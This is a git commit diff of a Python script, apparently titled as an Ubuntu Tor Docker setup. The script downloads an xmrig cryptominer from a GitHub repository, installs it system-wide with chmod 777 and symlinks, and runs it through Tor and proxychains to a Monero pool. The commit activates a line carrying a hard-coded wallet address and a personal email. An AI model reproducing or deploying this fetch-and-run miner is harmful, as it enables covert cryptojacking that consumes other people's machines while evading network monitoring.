d7e6502aaeb62a58664894ff2c1f89523a6eeb39
wollfoo <nhac.tien1988@gmail.com>
2023-08-06 02:23:28 +0700

    Update ubuntu_tor_docker.py

--- ubuntu_tor_docker.py
+++ ubuntu_tor_docker.py
@@ -29,15 +29,13 @@ try:
     if os.path.isfile('/usr/local/bin/' + program) == False:
         os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
         os.system('chmod 777 ' + workingdir + '/' + program)
-        #workingdir = os.getcwd()
+        workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
         time.sleep (2)
-    #else:
-        #print 'Da co'
 except:
     pass
 os.system('tor &')
 time.sleep(60)
-#os.system ('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao.orcfullaz/jmayo66@yahoo.com -p az -a rx/0 -k --tls -t ' + str(cores))
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://5pwcq42aa42fjzel.onion:442 --tls -t ' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao.orcfullaz/jmayo66@yahoo.com -p az -a rx/0 -k --tls -t ' + str(cores))
+#os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://5pwcq42aa42fjzel.onion:442 --tls -t ' + str(cores))
